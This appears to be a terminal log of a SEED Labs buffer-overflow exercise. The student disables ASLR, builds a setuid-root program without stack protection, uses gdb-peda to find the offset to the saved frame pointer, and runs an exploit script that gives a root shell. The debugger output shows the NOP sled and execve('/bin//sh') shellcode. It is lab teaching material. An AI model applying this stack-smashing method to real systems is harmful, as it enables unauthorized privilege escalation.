[06/20/22]seed@VM:~/.../b1_17$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/20/22]seed@VM:~/.../b1_17$ sudo ln -sf /bin/zsh /bin/sh
[06/20/22]seed@VM:~/.../b1_17$ sudo su
root@VM:/home/seed/practice/b1_17# gcc -m32 -o A1 -z execstack -fno-stack-protector A1.c
root@VM:/home/seed/practice/b1_17# sudo chown root A1
root@VM:/home/seed/practice/b1_17# sudo chmod 4755 A1
root@VM:/home/seed/practice/b1_17# su seed
[06/20/22]seed@VM:~/.../b1_17$ touch badfile
[06/20/22]seed@VM:~/.../b1_17$ gcc  -m32 -o A1_dbg -g -z execstack -fno-stack-protector A1.c
[06/20/22]seed@VM:~/.../b1_17$ gdb A1_gdb
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
A1_gdb: No such file or directory.
gdb-peda$ q
[06/20/22]seed@VM:~/.../b1_17$ gdb A1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from A1_dbg...
gdb-peda$ b basic_func 
Breakpoint 1 at 0x13a0: file A1.c, line 25.
gdb-peda$ r
Starting program: /home/seed/practice/b1_17/A1_dbg 
Input size: 517
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fac --> 0x3eb4 
ECX: 0x0 
EDX: 0x2cbd16ce 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffd3dc --> 0x56556517 (<main+268>:	add    esp,0x10)
EIP: 0x565563a0 (<basic_func>:	endbr32)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655639b <foo+142>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x5655639e <foo+145>:	leave  
   0x5655639f <foo+146>:	ret    
=> 0x565563a0 <basic_func>:	endbr32 
   0x565563a4 <basic_func+4>:	push   ebp
   0x565563a5 <basic_func+5>:	mov    ebp,esp
   0x565563a7 <basic_func+7>:	push   ebx
   0x565563a8 <basic_func+8>:	sub    esp,0x124
[------------------------------------stack-------------------------------------]
0000| 0xffffd3dc --> 0x56556517 (<main+268>:	add    esp,0x10)
0004| 0xffffd3e0 --> 0xffffd3f3 --> 0x90909090 
0008| 0xffffd3e4 --> 0x3039 ('90')
0012| 0xffffd3e8 --> 0x49 ('I')
0016| 0xffffd3ec --> 0x2cbd16ce 
0020| 0xffffd3f0 --> 0x905551b4 
0024| 0xffffd3f4 --> 0x90909090 
0028| 0xffffd3f8 --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, basic_func (
    str=0xffffd3f3 '\220' <repeats 64 times>, "\061\300Ph//shh/bin\211\343PS\211\341\061\322\061\300\260\vÍ€", '\220' <repeats 109 times>..., a=0x3039, 
    b=0x49, session=0x2cbd16ce) at A1.c:25
25	void basic_func(char* str, int a ,int b, int session){
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3f3 --> 0x90909090 
EBX: 0x56558fac --> 0x3eb4 
ECX: 0x0 
EDX: 0x2cbd16ce 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2b0 --> 0x0 
EIP: 0x565563b9 (<basic_func+25>:	sub    esp,0x8)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565563a8 <basic_func+8>:	sub    esp,0x124
   0x565563ae <basic_func+14>:	call   0x56556210 <__x86.get_pc_thunk.bx>
   0x565563b3 <basic_func+19>:	add    ebx,0x2bf9
=> 0x565563b9 <basic_func+25>:	sub    esp,0x8
   0x565563bc <basic_func+28>:	push   DWORD PTR [ebp+0x14]
   0x565563bf <basic_func+31>:	lea    eax,[ebx-0x1f55]
   0x565563c5 <basic_func+37>:	push   eax
   0x565563c6 <basic_func+38>:	call   0x56556110 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2b0 --> 0x0 
0004| 0xffffd2b4 --> 0x0 
0008| 0xffffd2b8 --> 0x1626f2 
0012| 0xffffd2bc --> 0x81b4 
0016| 0xffffd2c0 --> 0x1 
0020| 0xffffd2c4 --> 0x3e8 
0024| 0xffffd2c8 --> 0x3e8 
0028| 0xffffd2cc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
28	    printf("Requested session = %d\n", session);
gdb-peda$ n
Requested session = 750589646
[----------------------------------registers-----------------------------------]
EAX: 0x1e 
EBX: 0x56558fac --> 0x3eb4 
ECX: 0x0 
EDX: 0x5655706e --> 0x62007200 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd3d8 --> 0xffffd608 --> 0x0 
ESP: 0xffffd2b0 --> 0x0 
EIP: 0x565563ce (<basic_func+46>:	sub    esp,0x8)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565563c5 <basic_func+37>:	push   eax
   0x565563c6 <basic_func+38>:	call   0x56556110 <printf@plt>
   0x565563cb <basic_func+43>:	add    esp,0x10
=> 0x565563ce <basic_func+46>:	sub    esp,0x8
   0x565563d1 <basic_func+49>:	push   DWORD PTR [ebp+0x8]
   0x565563d4 <basic_func+52>:	lea    eax,[ebp-0x11b]
   0x565563da <basic_func+58>:	push   eax
   0x565563db <basic_func+59>:	call   0x56556160 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2b0 --> 0x0 
0004| 0xffffd2b4 --> 0x0 
0008| 0xffffd2b8 --> 0x1626f2 
0012| 0xffffd2bc --> 0x81b4 
0016| 0xffffd2c0 --> 0x1 
0020| 0xffffd2c4 --> 0x3e8 
0024| 0xffffd2c8 --> 0x3e8 
0028| 0xffffd2cc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
29	    strcpy(buffer1, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffd3d8
gdb-peda$ p &buffer1 
$2 = (char (*)[275]) 0xffffd2bd
gdb-peda$ p/d 0xffffd3d8 - 0xffffd2bd
$3 = 283
gdb-peda$ q
[06/20/22]seed@VM:~/.../b1_17$ python3 exploit.py 
[06/20/22]seed@VM:~/.../b1_17$ ./A1
Input size: 517
Requested session = 821961462
Verified session = 821961462
# whoami                                                                       
root

